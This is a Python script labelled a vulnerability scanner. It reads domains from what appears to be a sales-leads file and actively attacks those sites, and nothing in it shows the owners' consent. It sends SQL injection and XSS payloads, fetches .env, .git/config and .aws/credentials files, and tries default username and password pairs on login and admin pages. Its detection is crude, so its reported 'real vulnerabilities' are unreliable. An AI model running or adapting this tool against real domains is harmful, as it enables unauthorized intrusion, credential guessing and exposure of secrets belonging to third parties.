#!/usr/bin/env python3
"""
ACTUAL Vulnerability Scanner - Finds REAL exploitable issues
Tests for: SQL injection, XSS, exposed files, weak auth, unencrypted APIs, etc.
"""

import json
import requests
import re
from datetime import datetime
from typing import Dict, List
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class ActualVulnerabilityScanner:
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0'
        })
    
    def scan_domain(self, domain: str) -> Dict:
        """Scan for ACTUAL vulnerabilities."""
        findings = []
        
        print(f"\n🔍 Scanning: {domain}")
        
        # Test REAL vulnerabilities
        findings.extend(self.test_sql_injection(domain))
        findings.extend(self.test_xss_vulnerability(domain))
        findings.extend(self.test_exposed_files(domain))
        findings.extend(self.test_weak_authentication(domain))
        findings.extend(self.test_unencrypted_api(domain))
        findings.extend(self.test_default_credentials(domain))
        findings.extend(self.test_cors_misconfiguration(domain))
        
        severity = "critical" if any(f.get('severity') == 'critical' for f in findings) else \
                   "high" if any(f.get('severity') == 'high' for f in findings) else \
                   "medium" if findings else "low"
        
        if findings:
            print(f"   🚨 Found {len(findings)} REAL vulnerabilities!")
        else:
            print(f"   ✅ No exploitable vulnerabilities found")
        
        return {
            "domain": domain,
            "scan_date": datetime.now().isoformat(),
            "findings": findings,
            "severity": severity,
            "total_findings": len(findings),
            "real_vulnerabilities": len(findings) > 0
        }
    
    # ========================================================================
    # 1. SQL INJECTION TEST
    # ========================================================================
    
    def test_sql_injection(self, domain: str) -> List[Dict]:
        """Test for SQL injection vulnerabilities."""
        findings = []
        
        # Common vulnerable endpoints
        endpoints = [
            '/?id=1',
            '/?search=test',
            '/?user=admin',
            '/api/users?id=1',
            '/login?email=test',
        ]
        
        sql_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "admin' --",
        ]
        
        try:
            for endpoint in endpoints:
                for payload in sql_payloads:
                    try:
                        # Test with SQL injection payload
                        response = requests.get(
                            f"https://{domain}{endpoint.split('=')[0]}={payload}",
                            timeout=5,
                            verify=False
                        )
                        
                        # Check for SQL error messages (indicator of vulnerability)
                        if any(keyword in response.text.lower() for keyword in 
                               ['sql', 'mysql', 'syntax error', 'database', 'query']):
                            findings.append({
                                "type": "SQL Injection Vulnerability",
                                "severity": "critical",
                                "endpoint": endpoint,
                                "payload": payload,
                                "description": "Application appears vulnerable to SQL injection",
                                "impact": "Attacker could read/modify database",
                                "action": "Implement prepared statements, input validation"
                            })
                            print(f"   🚨 CRITICAL: SQL Injection on {endpoint}")
                            break
                    except:
                        pass
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 2. XSS (Cross-Site Scripting) TEST
    # ========================================================================
    
    def test_xss_vulnerability(self, domain: str) -> List[Dict]:
        """Test for XSS vulnerabilities."""
        findings = []
        
        xss_payload = "<script>alert('XSS')</script>"
        test_endpoints = [
            '/?search=' + xss_payload,
            '/api/test?input=' + xss_payload,
            '/search?q=' + xss_payload,
        ]
        
        try:
            for endpoint in test_endpoints:
                try:
                    response = requests.get(
                        f"https://{domain}{endpoint}",
                        timeout=5,
                        verify=False,
                        allow_redirects=True
                    )
                    
                    # If payload is reflected in response without encoding
                    if xss_payload in response.text:
                        findings.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "high",
                            "endpoint": endpoint.split('=')[0],
                            "payload": xss_payload,
                            "description": "User input is reflected without sanitization",
                            "impact": "Attacker can steal cookies, sessions, deface page",
                            "action": "Sanitize user input, use CSP header, encode output"
                        })
                        print(f"   🚨 HIGH: XSS vulnerability on {endpoint.split('=')[0]}")
                        break
                except:
                    pass
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 3. EXPOSED FILES (Real files with real content)
    # ========================================================================
    
    def test_exposed_files(self, domain: str) -> List[Dict]:
        """Test for actually exposed files with sensitive content."""
        findings = []
        
        critical_files = {
            '/.env': {'sensitivity': 'critical', 'markers': ['password', 'key', 'secret', 'api_key']},
            '/.git/config': {'sensitivity': 'critical', 'markers': ['repository', 'url']},
            '/config.php': {'sensitivity': 'high', 'markers': ['password', 'database', 'host']},
            '/database.sql': {'sensitivity': 'critical', 'markers': ['create table', 'insert', 'password']},
            '/web.config': {'sensitivity': 'high', 'markers': ['connectionstring', 'password']},
            '/.aws/credentials': {'sensitivity': 'critical', 'markers': ['aws_access_key', 'aws_secret']},
        }
        
        try:
            for file_path, info in critical_files.items():
                try:
                    response = requests.get(
                        f"https://{domain}{file_path}",
                        timeout=5,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    # Check if file actually exists AND has sensitive content
                    if response.status_code == 200 and len(response.text) > 100:
                        # Check for actual sensitive markers
                        has_sensitive_content = any(
                            marker in response.text.lower() 
                            for marker in info['markers']
                        )
                        
                        if has_sensitive_content:
                            findings.append({
                                "type": f"Exposed Sensitive File: {file_path}",
                                "severity": info['sensitivity'],
                                "file": file_path,
                                "size": len(response.text),
                                "description": f"Sensitive file {file_path} is publicly accessible",
                                "impact": f"Attacker can read {info['sensitivity']} data",
                                "action": f"Remove {file_path} from web root or restrict access"
                            })
                            print(f"   🚨 {info['sensitivity'].upper()}: Exposed {file_path}")
                        else:
                            print(f"   ℹ️  {file_path} exists but no sensitive content detected")
                
                except:
                    pass
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 4. WEAK AUTHENTICATION
    # ========================================================================
    
    def test_weak_authentication(self, domain: str) -> List[Dict]:
        """Test for weak authentication."""
        findings = []
        
        # Test for default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
        ]
        
        login_endpoints = [
            '/api/login',
            '/api/auth',
            '/login',
            '/admin/login',
        ]
        
        try:
            for endpoint in login_endpoints:
                for username, password in default_creds:
                    try:
                        response = requests.post(
                            f"https://{domain}{endpoint}",
                            data={'username': username, 'password': password},
                            json={'username': username, 'password': password},
                            timeout=5,
                            verify=False
                        )
                        
                        # Check if login successful (common indicators)
                        if any(keyword in response.text.lower() for keyword in 
                               ['success', 'dashboard', 'token', 'login successful', 'authenticated']):
                            findings.append({
                                "type": "Weak/Default Credentials",
                                "severity": "critical",
                                "endpoint": endpoint,
                                "credentials": f"{username}:{password}",
                                "description": f"Default credentials {username}:{password} work!",
                                "impact": "Attacker can gain full account access",
                                "action": "Force password change, disable default accounts"
                            })
                            print(f"   🚨 CRITICAL: Default creds work on {endpoint}!")
                    except:
                        pass
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 5. UNENCRYPTED API
    # ========================================================================
    
    def test_unencrypted_api(self, domain: str) -> List[Dict]:
        """Test if API returns sensitive data without authentication."""
        findings = []
        
        api_endpoints = [
            '/api/users',
            '/api/v1/users',
            '/api/customers',
            '/api/data',
            '/api/sensitive',
        ]
        
        try:
            for endpoint in api_endpoints:
                try:
                    response = requests.get(
                        f"https://{domain}{endpoint}",
                        timeout=5,
                        verify=False
                    )
                    
                    # If returns 200 without auth + has user data
                    if response.status_code == 200 and len(response.text) > 100:
                        try:
                            data = response.json()
                            # Check if looks like user/customer data
                            if any(key in str(data).lower() for key in 
                                   ['email', 'password', 'phone', 'address', 'card']):
                                findings.append({
                                    "type": "Unauthorized API Access",
                                    "severity": "critical",
                                    "endpoint": endpoint,
                                    "description": "API returns sensitive data without authentication",
                                    "impact": "Attacker can read all user/customer data",
                                    "action": "Require authentication (API key, OAuth, JWT)"
                                })
                                print(f"   🚨 CRITICAL: Unauthorized API access on {endpoint}")
                        except:
                            pass
                except:
                    pass
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 6. CORS MISCONFIGURATION
    # ========================================================================
    
    def test_cors_misconfiguration(self, domain: str) -> List[Dict]:
        """Test for CORS misconfiguration."""
        findings = []
        
        try:
            response = requests.get(
                f"https://{domain}",
                headers={'Origin': 'https://evil.com'},
                timeout=5,
                verify=False
            )
            
            # Check CORS headers
            cors_origin = response.headers.get('Access-Control-Allow-Origin', '')
            cors_creds = response.headers.get('Access-Control-Allow-Credentials', '')
            
            # Misconfiguration: allows any origin + credentials
            if cors_origin == '*' and cors_creds.lower() == 'true':
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": "high",
                    "description": "CORS allows any origin with credentials",
                    "impact": "Evil website can make requests on behalf of users",
                    "action": "Restrict Access-Control-Allow-Origin to trusted domains"
                })
                print(f"   🚨 HIGH: CORS misconfiguration")
            elif cors_origin == '*':
                findings.append({
                    "type": "CORS Misconfiguration",
                    "severity": "medium",
                    "description": "CORS allows requests from any origin",
                    "impact": "Any website can access this API",
                    "action": "Restrict Access-Control-Allow-Origin"
                })
                print(f"   ⚠️  MEDIUM: CORS allows any origin")
        except:
            pass
        
        return findings
    
    # ========================================================================
    # 7. DEFAULT PASSWORDS
    # ========================================================================
    
    def test_default_credentials(self, domain: str) -> List[Dict]:
        """Test for known default passwords."""
        findings = []
        
        # Common admin panels with defaults
        admin_paths = {
            '/admin': [('admin', 'admin'), ('admin', '12345')],
            '/administrator': [('admin', 'admin')],
            '/phpmyadmin': [('root', 'root'), ('root', '')],
        }
        
        try:
            for path, creds_list in admin_paths.items():
                for username, password in creds_list:
                    try:
                        response = requests.post(
                            f"https://{domain}{path}",
                            data={'username': username, 'password': password, 'login': 'login'},
                            timeout=5,
                            verify=False,
                            allow_redirects=False
                        )
                        
                        # Check if login worked (no 401/403)
                        if response.status_code not in [401, 403]:
                            findings.append({
                                "type": "Default Credentials on Admin Panel",
                                "severity": "critical",
                                "panel": path,
                                "credentials": f"{username}:{password}",
                                "description": f"Admin panel {path} uses default credentials",
                                "impact": "Full admin access compromised",
                                "action": "Change default credentials immediately"
                            })
                            print(f"   🚨 CRITICAL: Default creds on {path}!")
                    except:
                        pass
        except:
            pass
        
        return findings

# ============================================================================
# MAIN
# ============================================================================

def main():
    """Run actual vulnerability scanner."""
    
    try:
        with open('data/vapt_qualified_leads.json', 'r') as f:
            leads = json.load(f)
            domains = [lead.get('domain') for lead in leads if lead.get('domain')]
    except FileNotFoundError:
        print("❌ No leads file found!")
        return
    
    print("=" * 70)
    print("🔐 ACTUAL VULNERABILITY SCANNER")
    print("Testing for REAL exploitable vulnerabilities")
    print("=" * 70)
    
    scanner = ActualVulnerabilityScanner()
    results = []
    
    for domain in domains[:5]:  # Scan first 5
        result = scanner.scan_domain(domain)
        results.append(result)
    
    # Save results
    with open('data/vapt_actual_vulnerabilities.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print("\n" + "=" * 70)
    print("✅ Scan complete!")
    print(f"✅ Saved to: data/vapt_actual_vulnerabilities.json")
    print()
    
    # Summary
    total = sum(r['total_findings'] for r in results)
    critical = len([r for r in results if r['severity'] == 'critical'])
    
    print(f"📊 Summary:")
    print(f"   Companies scanned: {len(results)}")
    print(f"   Companies with REAL vulnerabilities: {len([r for r in results if r['total_findings'] > 0])}")
    print(f"   Total REAL issues: {total}")
    print(f"   Critical findings: {critical}")
    print()

if __name__ == "__main__":
    main()
